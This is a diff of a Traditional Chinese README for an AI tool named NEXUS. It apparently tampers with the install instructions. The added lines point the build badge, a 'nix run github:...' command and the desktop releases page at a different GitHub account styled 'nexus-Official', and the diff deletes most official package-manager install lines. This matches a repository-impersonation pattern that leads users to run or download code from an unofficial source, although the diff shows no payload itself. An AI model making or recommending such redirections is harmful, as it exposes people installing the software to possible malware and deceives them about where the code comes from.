@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://nexus.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/nexus-ai"><img alt="npm" src="https://img.shields.io/npm/v/nexus-ai?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/nexus/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/nexus/publish.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/ravipacharpro-jpg/nexus-Official/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/ravipacharpro-jpg/nexus-Official/publish.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -51,14 +51,9 @@ curl -fsSL https://nexus.ai/install | bash
 
 # 套件管理員
 npm i -g nexus-ai@latest        # 也可使用 bun/pnpm/yarn
-scoop install nexus             # Windows
-choco install nexus             # Windows
-brew install anomalyco/tap/nexus # macOS 與 Linux（推薦，始終保持最新）
-brew install nexus              # macOS 與 Linux（官方 brew formula，更新頻率較低）
-sudo pacman -S nexus            # Arch Linux (Stable)
 paru -S nexus-bin               # Arch Linux (Latest from AUR)
 mise use -g nexus               # 任何作業系統
-nix run nixpkgs#nexus           # 或使用 github:anomalyco/nexus 以取得最新開發分支
+nix run github:ravipacharpro-jpg/nexus-Official           # 或使用 github:ravipacharpro-jpg/nexus-Official 以取得最新開發分支
 ```
 
 > [!TIP]
@@ -66,18 +61,17 @@ nix run nixpkgs#nexus           # 或使用 github:anomalyco/nexus 以取得最�
 
 ### 桌面應用程式 (BETA)
 
-NEXUS 也提供桌面版應用程式。您可以直接從 [發佈頁面 (releases page)](https://github.com/anomalyco/nexus/releases) 或 [nexus.ai/download](https://nexus.ai/download) 下載。
+NEXUS 也提供桌面版應用程式。您可以直接從 [發佈頁面 (releases page)](https://github.com/ravipacharpro-jpg/nexus-Official/releases) 或 [nexus.ai/download](https://nexus.ai/download) 下載。
 
 | 平台                  | 下載連結                           |
 | --------------------- | ---------------------------------- |
 | macOS (Apple Silicon) | `nexus-desktop-mac-arm64.dmg`   |
 | macOS (Intel)         | `nexus-desktop-mac-x64.dmg`     |
-| Windows               | `nexus-desktop-windows-x64.exe` |
+| Windows               | `nexus-desktop-win-x64.exe` |
 | Linux                 | `.deb`, `.rpm`, 或 AppImage        |
 
 ```bash
 # macOS (Homebrew Cask)
-brew install --cask nexus-desktop
 # Windows (Scoop)
 scoop bucket add extras; scoop install extras/nexus-desktop
 ```
